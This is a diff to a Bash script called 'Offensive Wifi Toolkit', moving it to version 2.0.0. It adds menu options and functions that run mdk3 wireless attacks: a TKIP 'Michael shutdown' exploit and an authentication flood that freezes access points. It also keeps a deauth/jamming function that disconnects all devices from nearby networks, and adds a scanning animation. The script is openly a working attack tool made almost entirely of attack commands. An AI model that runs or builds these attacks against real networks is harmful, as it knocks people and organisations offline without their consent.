@@ -2,7 +2,7 @@
 #Offensive Wifi Toolkit (owt) 
 #Project start date (Feb. 8 2021)
 #Created By Brennan Mccown (clu3bot)
-#Version 1.2.4
+#Version 2.0.0
 #GPL v3.0 License
 #
 #colors vars
@@ -18,7 +18,7 @@ NONE='\033[0m'
 S=1000
 mon=Monitor
 man=Managed
-version="1.2.4"
+version="2.0.0"
 language="English"
 #user="clu3bot"
 github="https://github.com/clu3bot/"
@@ -287,8 +287,8 @@ else
         read -r -p "Press Enter to continue to Main Menu"
                 main_menu
 fi
-        echo -e "${NONE}[${LRED}Scaning for Networks${NONE}]"
-
+        scan_animation & 
+        
                 trap 'airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null' EXIT
                 xterm -e airodump-ng --output-format csv -w otp "$iface" > /dev/null & sleep 10 ; kill $!
         sed -i '1d' otp-01.csv
@@ -339,7 +339,9 @@ check_mode
 	ewr "${YELLOW}2]Deauth/Jamming Attack"
 	ewr "${YELLOW}3]Basic AP Probe"
 	ewr "${YELLOW}4]WIDS/WIPS Confusion Attack"
-	ewr "${LGREEN}*****************${NONE}"
+	ewr "${YELLOW}5]Michael Shutdown Exploitation"
+        ewr "${YELLOW}6]Authentication DoS Attack (AP Freeze)"
+        ewr "${LGREEN}*****************${NONE}"
 while true; do
 echo -e "${LRED}Select an option:${NONE}"
 read -r -p "$(tput setaf 7)" option
@@ -365,6 +367,14 @@ case $option in
      read -r -p "Are you sure? Press Enter.."
      confusion_attack
      ;;
+  5) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
+     read -r -p "Are you sure? Press Enter.."
+     michael_shutdown
+     ;;
+  6) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
+     read -r -p "Are you sure? Press Enter.."
+     authentication_dos
+     ;;
   *) echo -e "Not an Option"
      wifi_attacks_menu
      ;;
@@ -387,19 +397,22 @@ echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Spamming Network APs${NONE}"
 mdk3 "$iface" b -s 250
 }
 
+#traps ctrl c 
+
 #airplay deauth attack using mdk3
 deauth_attack () {
 clear
 check_mode
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
-sleep 0.5
-echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Deauth/Jammer Selected${NONE}"
-sleep 1
-echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
-sleep 1
-echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Disconnecting all Devices From Networks..${NONE}"
-mdk3 "$iface" d -c
+
+        echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
+        sleep 0.5
+        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Deauth/Jammer Selected${NONE}"
+        sleep 1
+        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
+        sleep 1
+        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Disconnecting all Devices From Networks..${NONE}"
+        mdk3 "$iface" d -c 
 }
 
 #wids/wips confusion attack using mdk3
@@ -434,6 +447,35 @@ echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Probing Network.."
 mdk3 "$iface" p -e "$nn"
 }
 
+
+michael_shutdown () {
+clear
+check_mode
+check_network_name
+echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
+sleep 0.5
+echo -e "${NONE}${LGREEN}*${NONE}]${LRED}TKIP Selected${NONE}"
+sleep 1
+echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
+sleep 1
+echo -e "${NONE}${LGREEN}*${NONE}]${LRED}TKIP Exploit Commencing.."
+mdk3 "$iface" m -t "$nn" -w 5 -n 100 
+}
+
+authentication_dos () {
+clear
+check_mode
+check_network_name
+echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
+sleep 0.5
+echo -e "${NONE}${LGREEN}*${NONE}]${LRED}TKIP Selected${NONE}"
+sleep 1
+echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
+sleep 1
+echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Authentication DoS Attack Commencing.."
+mdk3 "$iface" a -a "$nn" -c -s 400
+}
+
 #checks if interface is in monitor mode for variable assignment
 check_mode_for_vars () {
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
@@ -465,13 +507,11 @@ fi
 
 #checks if the network name is assigned
 check_network_name () {
-if [ -n "$nn" ]; then
-sleep 0.1
-else
-echo -e "${LBLUE}For this you must select a Network, would you like do do this now? ${LRED}(Y/N)${NONE}"
+if [ -z ${nn+x} ]; then
 
+echo -e "${LBLUE}For this you must select a Network, would you like do do this now? ${LRED}(Y/N)${NONE}"
 read -r ra
-fi
+
 if [[ "$ra" == ["yY"]* ]]; then
         scan_network_networkname
 sleep 0.5
@@ -480,6 +520,12 @@ clear
 echo "Returning to Main Menu.."
 sleep 0.8
 main_menu
+fi
+
+else
+
+sleep 0.1
+
 fi
 }
 
@@ -500,7 +546,7 @@ else
         read -r -p "Press Enter to continue to Main Menu"
                 main_menu
 fi
-        echo -e "${NONE}[${LRED}Scaning for Networks${NONE}]"
+        scan_animation &
         
                 trap 'airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null' EXIT
                 xterm -e airodump-ng --output-format csv -w otp "$iface" > /dev/null & sleep 10 ; kill $!
@@ -517,6 +563,66 @@ done
         echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
         read -r -p "$(tput setaf 7)Press Enter to Continue.."
 clear
+}
+
+#animation while scanning networks.
+ii="S"
+oo="Sc"
+pp="Sca"
+ll="Scan"
+kk="Scann"
+jj="Scanni"
+hh="Scannin"
+gg="Scanning"
+ff="Scanning-"
+vv="Scanning-N"
+bb="Scanning-Ne"
+cc="Scanning-Net"
+xx="Scanning-Netw"
+zz="Scanning-Netwo"
+yy="Scanning-Networ"
+tt="Scanning-Network"
+qq="Scanning-Networks"
+
+s() {
+sleep 0.15
+clear
+}
+
+scan_animation() {
+echo -e "[${LBLUE}${ii}${NONE}]" 
+s
+echo -e "[${LBLUE}${oo}${NONE}]"  
+s
+echo -e "[${LBLUE}${pp}${NONE}]"  
+s
+echo -e "[${LBLUE}${ll}${NONE}]"  
+s 
+echo -e "[${LBLUE}${kk}${NONE}]"  
+s
+echo -e "[${LBLUE}${jj}${NONE}]"  
+s
+echo -e "[${LBLUE}${hh}${NONE}]"  
+s
+echo -e "[${LBLUE}${gg}${NONE}]"  
+s
+echo -e "[${LBLUE}${ff}${NONE}]"  
+s
+echo -e "[${LBLUE}${vv}${NONE}]"  
+s
+echo -e "[${LBLUE}${bb}${NONE}]"  
+s
+echo -e "[${LBLUE}${cc}${NONE}]"  
+s
+echo -e "[${LBLUE}${xx}${NONE}]"  
+s
+echo -e "[${LBLUE}${zz}${NONE}]"  
+s
+echo -e "[${LBLUE}${yy}${NONE}]"  
+s
+echo -e "[${LBLUE}${tt}${NONE}]" 
+s
+echo -e "[${LBLUE}${qq}${NONE}]" 
 }
 
 #stops or keeps monitor mode on termination
@@ -632,8 +738,6 @@ done
 
 #prints
 clear
-echo "Device now in ${mode} Mode"
-sleep 1
 main_menu
 
 #functions
@@ -658,8 +762,8 @@ check_mode
 check_network_name
 scan_network_networkname
 termination
+ctrl_c
+scan_animation
 }
 
 OWT
-
-
